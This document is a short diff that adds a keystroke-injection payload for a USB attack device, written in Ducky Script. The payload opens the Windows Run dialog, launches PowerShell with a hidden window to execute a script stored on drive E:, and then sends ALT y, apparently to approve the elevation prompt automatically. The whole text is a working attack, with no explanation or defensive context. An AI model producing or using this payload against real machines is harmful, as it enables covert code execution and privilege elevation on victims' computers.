@@ -1,0 +1,7 @@
+GUI r
+DELAY 300
+STRING powershell -w h iex (E:\a.ps1)
+DELAY 200
+ENTER
+DELAY 1000
+ALT y
